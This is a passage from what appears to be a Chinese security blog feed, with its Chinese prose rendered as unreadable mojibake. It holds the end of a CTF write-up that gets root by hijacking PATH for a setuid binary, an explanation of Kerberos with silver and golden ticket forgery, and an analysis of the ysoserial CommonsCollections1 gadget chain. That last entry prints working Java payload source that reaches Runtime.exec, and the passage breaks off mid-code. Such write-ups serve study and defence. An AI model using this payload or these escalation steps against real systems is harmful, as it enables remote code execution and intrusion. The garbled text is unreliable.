8848</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202407486.png" alt="image-20201208202407486"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æŸ¥æ‰¾ä¸€ä¸‹<code>setuid</code>æƒé™çš„æ–‡ä»¶</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202501668.png" alt="image-20201208202501668"></p><p>è¿™ä¸ª<code>status</code>ä¹Ÿæ˜¯è€æœ‹å‹äº†ï¼Œä¸‹è½½ä¸‹æ¥åç¼–è¯‘ä¸€ä¸‹</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202538533.png" alt="image-20201208202538533"></p><p>è°ƒç”¨äº†<code>service</code>å‘½ä»¤ï¼Œç›´æ¥åŠ«æŒ<code>PATH</code></p><p>åŠ«æŒåˆ°<code>/tmp</code>ç›®å½•ä¸‹ï¼Œå†™å…¥ä¸€ä¸ª<code>service</code>æ–‡ä»¶ï¼Œå¹¶ç»™å¯æ‰§è¡Œæƒé™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202701534.png" alt="image-20201208202701534"></p><p>è°ƒç”¨<code>status</code>å°±å¯ä»¥å¾—åˆ°rootæƒé™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202724394.png" alt="image-20201208202724394"></p><p><code>/root</code>ç›®å½•ä¸‹é¢æœ‰ä¸ªflag</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208202751435.png" alt="image-20201208202751435"></p>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows kerberosåè®®</title>
      <link href="/windows_kerberos.html"/>
      <url>/windows_kerberos.html</url>
      
        <content type="html"><![CDATA[<p>Windowsä¸‹<code>kerberos</code>åè®®çš„ç›¸å…³è®¤çŸ¥</p><a id="more"></a><p>å‰å‡ å¤©è¢«qaxçš„å¸ˆå‚…é¢è¯•ï¼Œé—®åˆ°äº†<code>kerberos</code>åè®®ï¼Œ<code>é»„é‡‘ç™½é“¶ç¥¨æ®</code>ç­‰ï¼Œç­”ä¸ä¸Šæ¥ã€‚</p><p>æ‰¾äº†ç‚¹èµ„æ–™ï¼Œå­¦ä¹ å­¦ä¹ ã€‚</p><p>å‚è€ƒçš„èµ„æ–™ä¼šåœ¨æœ¬æ–‡æœ€ååˆ—å‡ºã€‚</p><h1 id="kerberos"><a href="#kerberos" class="headerlink" title="kerberos"></a>kerberos</h1><p><font color='red'>æ³¨1ï¼šä»¥ä¸‹ä»£ç§°å¹¶éçœŸå®åè¯ï¼Œåªæ˜¯æˆ‘ä¸ºäº†å¥½è®°ï¼Œå–å¾—åå­—ã€‚</font></p><h2 id="èº«ä»½è®¤è¯"><a href="#èº«ä»½è®¤è¯" class="headerlink" title="èº«ä»½è®¤è¯"></a>èº«ä»½è®¤è¯</h2><p>åœ¨<strong>WindowsåŸŸç¯å¢ƒ</strong>èº«ä»½è®¤è¯çš„æ—¶å€™ä¼šç”¨åˆ°å®ƒ</p><p>(æœ‰å…³åŸŸçš„çŸ¥è¯†è¯·å‚è§<a href="./net_base_1.html">å¦ä¸€ç¯‡æ–‡ç« </a>)</p><p><code>kerberos</code>åè®®è®¤è¯çš„ç»“æœæ˜¯<strong>åŒå‘çš„</strong>ï¼ŒAè®¿é—®Bæ—¶ï¼Œä¸ä»…ä»…æ˜¯Bè¦ç¡®ä¿Aä¸æ˜¯ä¼ªé€ çš„ï¼ŒAä¹Ÿè¦ç¡®ä¿è¯·æ±‚çš„èµ„æºBä¸æ˜¯è¢«ä¼ªé€ çš„</p><p>ç„¶è€Œåœ¨èº«ä»½éªŒè¯çš„è¿‡ç¨‹ä¸­ï¼Œä¸èƒ½é‡‡å–åŒæ–¹ç›´æ¥éªŒè¯å¯†ç çš„å½¢å¼ï¼ˆå‡å¦‚å…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯å†’å……çš„ï¼Œå°±ä¼šè¢«å¥—åˆ°å¯†ç ï¼‰ï¼Œæ‰€ä»¥<code>kerberos</code>é‡‡ç”¨äº†ä¸€ä¸ªå¯ä¿¡ç¬¬ä¸‰æ–¹æ¥è¿›è¡ŒéªŒè¯ï¼Œè¿™ä¸ªå¯ä¿¡ç¬¬ä¸‰æ–¹å°±æ˜¯åŸŸæ§(<code>Domain Controler</code>)ï¼Œç§°ä¹‹ä¸º<code>KDC</code></p><h3 id="KDC"><a href="#KDC" class="headerlink" title="KDC"></a>KDC</h3><p>åŸŸä¸»æœºå­˜æ”¾ç€åŸŸå†…æ‰€æœ‰çš„è´¦å·å’Œå¯†ç </p><p>é€šè¿‡KDCè¿›è¡ŒéªŒè¯ï¼Œå¯ä»¥å‡å°‘åŸŸç®¡ç†å‘˜çš„å·¥ä½œé‡ï¼ˆå½“å‘ç”Ÿç”¨æˆ·ä¿¡æ¯å˜åŠ¨çš„æ—¶å€™ï¼Œä¸éœ€è¦åœ¨æ¯ä¸€å°ä¸»æœºä¸Šéƒ½è¿›è¡Œæ›´æ–°ä¿¡æ¯ã€‚</p><p>è´¦å·Aè®¿é—®èµ„æºBæ—¶ï¼Œä¼šå…ˆå’ŒKDCè¿›è¡Œèº«ä»½è®¤è¯ï¼Œç¡®è®¤Aå’ŒKDCçš„èº«ä»½ï¼Œè´¦å·Aè¯·æ±‚KDCå¸®å¿™è®¤è¯èµ„æºBï¼Œ</p><h3 id="è´¦æˆ·Aå’ŒKDCä¹‹é—´çš„è®¤è¯"><a href="#è´¦æˆ·Aå’ŒKDCä¹‹é—´çš„è®¤è¯" class="headerlink" title="è´¦æˆ·Aå’ŒKDCä¹‹é—´çš„è®¤è¯"></a>è´¦æˆ·Aå’ŒKDCä¹‹é—´çš„è®¤è¯</h3><p>å·²çŸ¥ï¼šåªæœ‰ è´¦æˆ·Aå’ŒKDCçŸ¥é“è´¦æˆ·Açš„å¯†ç ï¼Œå¦‚ä½•åœ¨ä¸æ³„æ¼å¯†ç çš„æƒ…å†µä¸‹éªŒè¯è‡ªå·±çš„èº«ä»½ã€‚</p><p><code>kerberos</code>åè®®ä¸­çš„éªŒè¯è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li> è´¦å·AæŠŠè‡ªå·±çš„å¯†ç é€šè¿‡hashå‡½æ•°è½¬æ¢æˆä¸€æŠŠå¯†é’¥ï¼Œç§°ä¹‹ä¸º<code>A_password_hash</code></li><li>ç”¨<code>A_password_hash</code>åŠ å¯†å½“å‰çš„æ—¶é—´æˆ³ï¼Œç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ç”¨<code>A_password_hash(date-time)</code>æ¥è¡¨ç¤º<ul><li>ä¸ºä»€ä¹ˆä¼šé€‰æ‹©ä½¿ç”¨æ—¶é—´æˆ³æ¥åŠ å¯†ï¼Ÿ<ul><li>  åŸå› æ˜¯<code>A_password_hash</code>å¯èƒ½è¢«æˆªè·å¹¶é‡æ”¾ï¼Œå¯¼è‡´<strong>é‡æ”¾æ”»å‡»</strong>ï¼Œä½†æ˜¯é‡æ”¾æ”»å‡»çš„ä¼ªé€ è¿‡ç¨‹éœ€è¦æ—¶é—´ï¼ŒKDCä¼šæŠŠè§£å¯†å¾—åˆ°çš„æ—¶é—´æˆ³å’Œå½“å‰æ—¶é—´åšä¸€ä¸ªå¯¹æ¯”ï¼Œå¦‚æœç›¸å·®è¿‡å¤§ï¼Œå°±åˆ¤æ–­æ˜¯é‡æ”¾æ”»å‡»ã€‚</li><li>  æ‰€ä»¥éœ€è¦åœ¨åŸŸä¸­åŒæ­¥æ‰€æœ‰æœºå™¨çš„æ—¶é—´ï¼Œå¦‚æœæœºå™¨æ—¶é—´ä¸å¯¹ï¼Œæ ¹æ®ä¸Šè¿°çš„è¿‡ç¨‹ï¼Œå®¹æ˜“è¢«æˆªè·åé€ æˆé‡æ”¾æ”»å‡»ã€‚</li></ul></li></ul></li><li> æŠŠä¸Šä¸€æ­¥ç”Ÿæˆçš„å­—ç¬¦ä¸²<code>A_password_hash(date-time)</code>åŠ ä¸Š<code>è´¦å·Açš„ä¿¡æ¯</code>ä»¥åŠ<code>ä¸€æ®µéšæœºå­—ç¬¦ä¸²</code>ï¼Œå‘é€ç»™KDCã€‚ç”¨<code>AS_REQ = &#123;A_password_hash(date-time), A_info, random_string&#125;</code>è¡¨ç¤ºè¿™ä¸ªè¯·æ±‚</li></ol><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/epub_729216_208.jpeg" alt="img"></p><blockquote><p>  ä¸Šå›¾æ¥è‡ªã€Šwireshark ç½‘ç»œåˆ†æå°±æ˜¯è¿™ä¹ˆç®€å•ã€‹</p></blockquote><p>æœ¬æ¬¡çš„<code>AS_REQ</code>å‘é€çš„è´¦æˆ·åæ˜¯<code>linp1</code>ï¼Œéšæœºå­—ç¬¦ä¸²æ˜¯<code>136224786</code></p><p>â€‹    ä¸Šè¿°è¿‡ç¨‹çš„æµç¨‹å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201205164502067.png" alt="image-20201205164502067"></p><ol start="4"><li><p>KDCæ”¶åˆ°<code>AS_REQ</code>ä¹‹åï¼Œå…ˆè¯»åˆ°è´¦å·Açš„ä¿¡æ¯<code>linp1</code>ï¼Œäºæ˜¯å»æŸ¥æ‰¾Açš„å¯†ç ï¼Œåœ¨ç”¨Açš„å¯†ç ç”Ÿæˆ<code>A_password_hash</code>ï¼Œå¦‚æœèƒ½è§£å¯†<code>A_password_hash(date-time)</code>åˆ™å¯¹è´¦å·Açš„éªŒè¯é€šè¿‡ï¼ˆå› ä¸ºåªæœ‰AçŸ¥é“è‡ªå·±çš„å¯†ç ï¼‰</p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201207140843369.png" alt="image-20201207140843369"></p></li></ol><p>æ—¢ç„¶Aå·²ç»å‘KDCè¯æ˜äº†è‡ªå·±çš„èº«ä»½ï¼Œé‚£å°±è½®åˆ°KDCå‘Aè¯æ˜äº†ã€‚</p><ol start="5"><li><p>KDCç”Ÿæˆä¸€ä¸ªå¯†é’¥<code>KDC_key</code>ï¼Œä½œä¸ºè´¦æˆ·Aå’ŒKDCä¹‹é—´è®¤è¯ç”¨ï¼ˆä¸ºäº†é¿å…æ¯ä¸€æ¬¡éƒ½è¦è¿›è¡Œç¹ççš„äº’ç›¸è®¤è¯ï¼‰ï¼ŒKDCæŠŠè‡ªå·±çš„å¯†ç åšæˆhash<code>KDC_password_hash</code>ï¼Œç”¨å®ƒåŠ å¯†<code>KDC_key</code>ï¼Œå¾—åˆ°ä¸€ä¸ª<code>TGT</code></p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201207141622277.png" alt="image-20201207141622277"></p><p> <code>TGT = KDC_password_hash(A_info, KDC_key)</code></p></li><li><p>KDCå‘è´¦æˆ·Aè¿”å›ä¸€ä¸ª<code>AS_REP</code>åŒ…</p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201207142419208.png" alt="image-20201207142419208"></p><p> <code>AS_REP = TGT, A_password_hash(KDC_key, date-time, random_string)</code></p></li><li><p>è´¦æˆ·Aæ¥æ”¶åˆ°äº†<code>AS_REP</code>ä¹‹åä½¿ç”¨<code>A_password_hash()</code>è§£å¯†<code>A_password_hash(KDC_key, date-time, random_string)</code>ï¼Œé€šè¿‡éªŒè¯<code>random_string</code>å’Œ<code>date-time</code>æ¥ç¡®å®šKDCèº«ä»½çš„çœŸå®æ€§ï¼Œå¦‚æœæ˜¯çœŸå®çš„ï¼Œåˆ™æŠŠ<code>KDC_key</code>å’Œ<code>TGT</code>ä¿å­˜èµ·æ¥å¤‡ç”¨ã€‚</p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208083725805.png" alt="image-20201208083725805"></p></li></ol><h3 id="Aè¯·KDCå¸®å¿™è®¤è¯èµ„æºB"><a href="#Aè¯·KDCå¸®å¿™è®¤è¯èµ„æºB" class="headerlink" title="Aè¯·KDCå¸®å¿™è®¤è¯èµ„æºB"></a>Aè¯·KDCå¸®å¿™è®¤è¯èµ„æºB</h3><ol><li><p>è´¦æˆ·Aå°†<code>TGT</code>äº¤è¿˜KDCï¼Œè¿˜æœ‰<strong>è´¦æˆ·Açš„ç›¸å…³ä¿¡æ¯ï¼Œæ—¶é—´æˆ³ï¼Œèµ„æºBçš„ç›¸å…³ä¿¡æ¯</strong>ï¼Œå‘é€ä¸€ä¸ª<code>TGS-REQ</code></p><p> <code>TGS-REQ = TGT, KDC_key(A_info, date-time), B_info</code></p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208103741964.png" alt="image-20201208103741964"></p></li><li><p>KDCå¾—åˆ°<code>TGS-REQ</code>ä¹‹åï¼Œå°†<code>TGT</code>è§£å¯†å¾—åˆ°<code>KDC_key</code>ï¼Œç”¨<code>KDC_key</code>è§£å¯†å‡º<code>A_info date-time</code>ç”¨äºè¯æ˜Açš„èº«ä»½ã€‚</p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208104303690.png" alt="image-20201208104303690"></p></li><li><p>KDC ç”Ÿæˆå¯†é’¥<code>KDC_AB_key</code>ï¼Œä¸€ä»½ç›´æ¥äº¤ç»™Aï¼Œå¦ä¸€ä»½é€šè¿‡Aäº¤ç»™Bã€‚ä¸ºäº†é˜²æ­¢èµ„æºBæ˜¯ä¼ªé€ çš„ï¼ŒKDCæŠŠèµ„æºBçš„å¯†ç hashæˆ<code>B_password_hash</code>ï¼Œç”¨<code>B_password_hash</code>åŠ å¯†<code>KDC_AB_key</code>ï¼Œåšæˆä¸€å¼ åªæœ‰Bï¼ˆé™¤äº†KDCï¼‰èƒ½è§£å¯†çš„ç¥¨æ®(<code>Ticket</code>)</p><p> <code>Ticket=B_password_hash(A_info, KDC_AB_key)</code></p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208104754206.png" alt="image-20201208104754206"></p><p> å‘é€ç»™è´¦æˆ·Açš„å›å¤<code>TGS_REP = KDC_key(KDC_AB_key), Ticket</code></p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208105932502.png" alt="image-20201208105932502"></p></li><li><p> è´¦æˆ·Aæ”¶åˆ°<code>TGS_REP</code>ï¼Œç”¨<code>KDC_key</code>è§£å¯†å‡º<code>KDC_AB_key</code>ï¼Œå¹¶ä¸”æŠŠ<code>Ticket</code>ç•™ä¸‹ï¼Œä½œä¸ºä¹‹åå’Œèµ„æºBè¿›è¡Œè®¿é—®çš„æ—¶å€™çš„ç¥¨æ®ã€‚é™ä½äº†KDCçš„è´Ÿæ‹…ã€‚</p></li></ol><h3 id="è´¦æˆ·Aå’Œèµ„æºBç›¸äº’è®¤è¯"><a href="#è´¦æˆ·Aå’Œèµ„æºBç›¸äº’è®¤è¯" class="headerlink" title="è´¦æˆ·Aå’Œèµ„æºBç›¸äº’è®¤è¯"></a>è´¦æˆ·Aå’Œèµ„æºBç›¸äº’è®¤è¯</h3><p>æ€»ç»“ä¸€ä¸‹åˆ°ç›®å‰ä¸ºæ­¢è´¦æˆ·Aæ‹¥æœ‰çš„æ•°æ®</p><ul><li>  <code>Ticket: B_password_hash(KDC_AB_key)</code></li><li>  <code>KDC_AB_key</code></li><li>  <code>KDC_A_key</code></li><li>  <code>TGT</code></li></ul><p>KDCæ‹œæ‰˜è´¦æˆ·Aè½¬äº¤ç»™èµ„æºBçš„æ˜¯<code>KDC_AB_key</code></p><ol><li><p>è´¦æˆ·Aç»™èµ„æºBå‘é€<code>AP-REQ</code></p><p> <code>AP_REQ = KDC_AB_key(A_info, date-time), Ticket</code></p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208112041712.png" alt="image-20201208112041712"></p></li><li><p>èµ„æºBæ”¶åˆ°<code>AP-REQ</code>ï¼Œä½¿ç”¨è‡ªå·±çš„å¯†ç <code>B_password_hash</code>è§£å¼€<code>Ticket</code>ï¼Œå¾—åˆ°<code>KDC_AB_key</code>ï¼Œä½¿ç”¨<code>KDC_AB_key</code>è§£å¯†ï¼Œå¾—åˆ°<code>A_info, date-time</code>ä»¥æ­¤ç¡®è®¤è´¦æˆ·Açš„èº«ä»½</p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208112801386.png" alt="image-20201208112801386"></p></li><li><p>èµ„æºBå›å¤ä¸€ä¸ª<code>AP-REP</code>ï¼Œæ¥å‘Aè¯æ˜è‡ªå·±çš„èº«ä»½</p><p> <code>AP-REP = KDC_AB_key(date-time)</code></p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208113234301.png" alt="image-20201208113234301"></p></li><li><p>è´¦æˆ·Aä½¿ç”¨<code>KDC_AB_key</code>è§£å¼€<code>date-time</code>ç¡®è®¤èµ„æºBçš„èº«ä»½</p><p> <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201208113212734.png" alt="image-20201208113212734"></p></li></ol><p>ä»¥åè´¦æˆ·Aå’Œèµ„æºBé€šä¿¡ä½¿ç”¨<code>KDC_AB_key</code>åŠ å¯†æµé‡ï¼Œè¿™ä¸ªkey<strong>åªæœ‰KDCï¼Œ è´¦æˆ·Aï¼Œ èµ„æºBçŸ¥é“</strong>ã€‚</p><h2 id="ç¥¨æ®"><a href="#ç¥¨æ®" class="headerlink" title="ç¥¨æ®"></a>ç¥¨æ®</h2><p>åœ¨ä¸Šè¿°çš„éªŒè¯è¿‡ç¨‹ä¸­ï¼Œå¦‚æœçŸ¥é“ä¸€äº›å†…å®¹ï¼Œå°±å¯ä»¥å¯¼è‡´ç¥¨æ®ä¼ é€’æ”»å‡»</p><ul><li>  ç™½é“¶ç¥¨æ®â€”â€”çŸ¥é“<code>B_password_hash</code></li><li>  é»„é‡‘ç¥¨æ®â€”â€”çŸ¥é“<code>KDC_password_hash</code></li></ul><h3 id="ç™½é“¶ç¥¨æ®"><a href="#ç™½é“¶ç¥¨æ®" class="headerlink" title="ç™½é“¶ç¥¨æ®"></a>ç™½é“¶ç¥¨æ®</h3><p>åœ¨ä¸Šè¿°<a href="#%E8%B4%A6%E6%88%B7A%E5%92%8C%E8%B5%84%E6%BA%90B%E7%9B%B8%E4%BA%92%E8%AE%A4%E8%AF%81">è´¦æˆ·Aå’Œèµ„æºBç›¸äº’è®¤è¯</a>çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœè´¦æˆ·Aæœ¬èº«å°±æœ‰èµ„æºBå¯†ç çš„hashå€¼<code>B_password_hash</code>é‚£ä¹ˆå°±å¯ä»¥ä¼ªé€ ä¸€ä»½<code>Ticket: B_password_hash(KDC_AB_key)</code></p><p>ç”±äº<code>KDC_AB_key</code>æ˜¯KDCé¢å‘ï¼Œç”¨äºABè®¤è¯ï¼Œé‚£ä¹ˆè´¦æˆ·Aå¯ä»¥è‡ªå·±ç”Ÿæˆä¸€ä¸ª<code>KDC_AB_key(ä¼ª)</code>ï¼Œç„¶åä½¿ç”¨<code>B_password_hash</code>åŠ å¯†è¿™ä¸ªä¼ªé€ çš„key</p><p><code>B_password_hash(KDC_AB_key(ä¼ª))</code></p><p>åœ¨èµ„æºbè®¤è¯çš„è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨è‡ªå·±çš„å¯†é’¥è¿›è¡Œè§£å¯†çš„æ—¶å€™ï¼Œè§£å¯†å‡ºæ¥çš„keyæ˜¯<code>KDC_AB_key(ä¼ª)</code>ï¼ŒåŒæ—¶è´¦æˆ·Aå‘é€çš„<code>KDC_AB_key(ä¼ª)(A_info, date-time)</code>ä¼šè¢«Bä½¿ç”¨ä¼ªé€ çš„keyæˆåŠŸè§£å¯†ï¼Œä»è€ŒéªŒè¯äº†Açš„èº«ä»½ï¼Œç»•è¿‡äº†KDCçš„éªŒè¯</p><p>ç‰¹ç‚¹ï¼š</p><ol><li> ä¸éœ€è¦ä¸KDCè¿›è¡Œäº¤äº’</li><li> éœ€è¦ç›®æ ‡èµ„æºçš„hash</li></ol><h3 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h3><p>å¦‚æœåœ¨ä¸Šè¿°<a href="#%E8%B4%A6%E6%88%B7A%E5%92%8CKDC%E4%B9%8B%E9%97%B4%E7%9A%84%E8%AE%A4%E8%AF%81">è´¦æˆ·Aå’ŒKDCè®¤è¯</a>æ—¶ï¼Œæ‹¥æœ‰<code>krbtgtç”¨æˆ·çš„hash</code>(<code>å³KDC_password_hash</code>)</p><p>é‚£ä¹ˆåœ¨è®¤è¯çš„è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨<code>KDC_password_hash</code>ç”Ÿæˆä¸€ä¸ªå‡çš„<code>TGT</code>ï¼Œè·³è¿‡è´¦æˆ·Aå’ŒKDCè®¤è¯ï¼Œé€šè¿‡ä¼ªé€ çš„<code>TGT</code>å’ŒKDCè¿›è¡Œäº¤äº’ï¼Œæ¬ºéª—KDCï¼Œå¾—åˆ°KDCçš„è®¤è¯</p>]]></content>
      
      
      <categories>
          
          <category> intranet - windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> kerberos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections1 åˆ†æ</title>
      <link href="/CommonCollections1.html"/>
      <url>/CommonCollections1.html</url>
      
        <content type="html"><![CDATA[<p>å¯¹<code>ysoserial</code>å·¥å…·ä¸­<code>CommonCollections1</code>åˆ©ç”¨é“¾åˆ†æï¼Œè·Ÿè¸ªè°ƒè¯•ã€‚</p><a id="more"></a><h1 id="CommonCollections1"><a href="#CommonCollections1" class="headerlink" title="CommonCollections1"></a>CommonCollections1</h1><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><h3 id="è°ƒç”¨æ ˆ"><a href="#è°ƒç”¨æ ˆ" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">LazyMap.get()</span></span><br><span class="line"><span class="comment">ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Class.getMethod()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><h4 id="CommonCollections1-java"><a href="#CommonCollections1-java" class="headerlink" title="CommonCollections1.java"></a>CommonCollections1.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">InvocationHandler</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line"><span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String command[] = &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;;</span><br><span class="line">    PayloadRunner.run(CommonsCollections1.class, command);</span><br><span class="line"><span class="comment">// PayloadRunner.run(CommonsCollections1.class, args);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ChainedTransformer</code>æ˜¯ä¸€ä¸ªå®ç°äº†<code>Transformmer</code>å’Œ<code>Serializable</code>æ¥å£çš„å¯¹è±¡</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="Transformer-java"><a href="#Transformer-java" class="headerlink" title="Transformer.java"></a>Transformer.java</h3><p><code>Transformer</code>æ¥å£é‡Œé¢åªæœ‰ä¸€ä¸ª<code>Transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 